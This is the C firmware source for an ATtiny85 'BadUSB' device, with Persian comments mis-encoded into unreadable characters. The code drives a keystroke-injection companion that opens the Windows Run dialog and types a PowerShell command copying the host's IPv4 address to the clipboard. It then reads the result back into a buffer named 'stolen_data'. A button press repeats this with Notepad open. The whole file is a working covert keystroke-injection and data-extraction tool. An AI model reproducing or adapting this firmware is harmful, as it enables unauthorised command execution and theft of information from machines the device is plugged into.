/*******************************************************
Project : Real BadUSB Final Fix v2
Chip    : ATtiny85
Clock   : 8.000000 MHz
*******************************************************/

#include <tiny85.h>
#include <delay.h>

#define TX_PIN PORTB.0
#define TX_DDR DDRB.0
#define RX_PIN PINB.1
#define RX_DDR DDRB.1
#define BTN_PIN PINB.4
#define BTN_DDR DDRB.4
#define BTN_PORT PORTB.4

#define BIT_DELAY_US 104 
#define HALF_BIT_DELAY_US 52

char stolen_data[32]; 

void uart_tx(char data) {
    unsigned char i;
    TX_PIN = 0; delay_us(BIT_DELAY_US);
    for (i = 0; i < 8; i++) {
        if (data & 1) TX_PIN = 1; else TX_PIN = 0;
        data >>= 1; delay_us(BIT_DELAY_US);
    }
    TX_PIN = 1; delay_us(BIT_DELAY_US);
}

void uart_print_flash(flash char *str) {
    while (*str) uart_tx(*str++);
}

void uart_print_ram(char *str) {
    while (*str) uart_tx(*str++);
}

char uart_rx(void) {
    unsigned char i;
    char data = 0;
    while (RX_PIN == 1); 
    delay_us(HALF_BIT_DELAY_US);
    if (RX_PIN == 1) return 0;
    delay_us(BIT_DELAY_US);
    for (i = 0; i < 8; i++) {
        data >>= 1;
        if (RX_PIN == 1) data |= 0x80;
        delay_us(BIT_DELAY_US);
    }
    delay_us(BIT_DELAY_US);
    return data;
}

flash char CMD_RUN[] = "CMD:RUN\n";
flash char CMD_GET_IP[] = "TYPE:powershell \"Set-Clipboard -Value (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]\"\n"; 
flash char KEY_ENTER[] = "KEY:ENTER\n";
flash char CMD_ASK_DATA[] = "ACTION:GET_CLIP\n";
flash char HEADER_TEXT[] = "TYPE:Extracted IP: \n";
// *** «÷«›Â ‘œÂ: ÅÌ‘Ê‰œ  «ÌÅ ***
flash char CMD_TYPE_PREFIX[] = "TYPE:";

void main(void) {
    int i;
    
    TX_DDR = 1; TX_PIN = 1;
    RX_DDR = 0; 
    BTN_DDR = 0; BTN_PORT = 1;

    delay_ms(1000);

    // --- ›«“ 1: Õ„·Â ---
    uart_print_flash(CMD_RUN);
    delay_ms(500);
    uart_print_flash(CMD_GET_IP);
    delay_ms(500);
    uart_print_flash(KEY_ENTER);
    delay_ms(2500); 

    uart_print_flash(CMD_ASK_DATA);

    for(i=0; i<32; i++) stolen_data[i] = 0;

    for(i=0; i<30; i++) {
        char c = uart_rx();
        if(c == '\n' || c == '\r') {
            stolen_data[i] = 0;
            break;
        }
        stolen_data[i] = c;
    }

    // --- ›«“ 2: œò„Â ---
    while (1) {
        if (BTN_PIN == 0) {
            delay_ms(50);
            if (BTN_PIN == 0) {
                // »«“ ò—œ‰ ‰Ê  Åœ
                uart_print_flash(CMD_RUN);
                delay_ms(500);
                uart_print_flash("TYPE:notepad\n");
                delay_ms(100);
                uart_print_flash(KEY_ENTER);
                delay_ms(1000);

                    // --- ›«“ 1: Õ„·Â ---
    uart_print_flash(CMD_RUN);
    delay_ms(500);
    uart_print_flash(CMD_GET_IP);
    delay_ms(500);
    uart_print_flash(KEY_ENTER);
    
    // ***  €ÌÌ— „Â„: «›“«Ì‘ “„«‰ ’»— »Â 5 À«‰ÌÂ ***
    // «Ì‰ »Â Å«Ê—‘· «Ã«“Â „ÌœÂœ ò«„· ·Êœ ‘Êœ Ê œ” Ê— —« «Ã—« ò‰œ
    delay_ms(5000); 

    uart_print_flash(CMD_ASK_DATA);

                while (BTN_PIN == 0); 
            }
        }
    }
}
